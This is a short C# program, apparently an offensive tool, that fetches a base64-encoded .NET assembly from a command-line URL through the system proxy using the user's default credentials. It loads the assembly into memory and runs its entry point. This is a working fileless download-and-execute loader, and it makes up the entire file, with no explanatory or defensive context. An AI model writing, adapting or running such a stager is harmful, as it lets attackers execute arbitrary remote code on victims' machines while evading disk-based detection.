﻿using System;
using System.Collections.Generic;
using System.Reflection;

namespace AssemblyExec
{
    class Program
    {
        private delegate byte[] delURL(string url);

        private static byte[] LoadURL(string url)
        {
            System.Net.IWebProxy defaultWebProxy = System.Net.WebRequest.DefaultWebProxy;
            defaultWebProxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
            return Convert.FromBase64String((new System.Net.WebClient() { Proxy = defaultWebProxy }).DownloadString(url));
        }

        private static void Exec(byte[] a, string[] param)
        {
            Assembly ass = Assembly.Load(a);
            MethodInfo meth = ass.EntryPoint;
            _ = meth.Invoke(null, new[] { param });
        }
        static void Main(string[] args)
        {
            delURL param = LoadURL;
            var dummy = new List<string>(args);
            dummy.RemoveRange(0, 2);
            Exec(param(args[1]), dummy.ToArray());
        }
    }
}
